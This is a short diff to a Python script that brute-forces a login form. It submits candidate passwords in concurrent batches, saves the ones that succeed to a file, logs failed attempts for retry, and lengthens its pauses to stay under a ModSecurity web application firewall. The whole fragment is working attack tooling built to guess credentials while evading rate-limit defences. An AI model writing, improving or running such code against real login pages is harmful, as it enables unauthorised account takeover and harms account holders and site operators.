@@ -77,7 +77,7 @@ if __name__ == "__main__":
 
             completed_futures = enumerate(concurrent.futures.as_completed(future_to_url))
             for index, future in completed_futures:
-                index += start_index
+                index += batch
                 try:
                     response = future.result()
                     if response.status_code == 200 :
@@ -89,10 +89,12 @@ if __name__ == "__main__":
                                 thepassword_file.write(response.request.data["pwd"])
                     elif response.status_code == 406:
                         print(f'request {index}: {response.status_code}, probably a timeout')
+                        with open('./failed_requests.txt', 'a+') as thepassword_file:
+                                thepassword_file.write(f"{response.request.data['pwd']}\n")
                 except Exception as e:
                     print('Looks like something went wrong:', e)
             
             # sleep for 5 minutes after executing a batch of [step] concurrent requests
             print(f"batch {batch} ended @ {datetime.now().strftime('%H:%M:%S')}")
             print("WAITING for ~ 5 MINTUES BECAUSE OF THE MOD_SECURITY WAF")
-            time.sleep(60*5+2)
+            time.sleep(60*6)
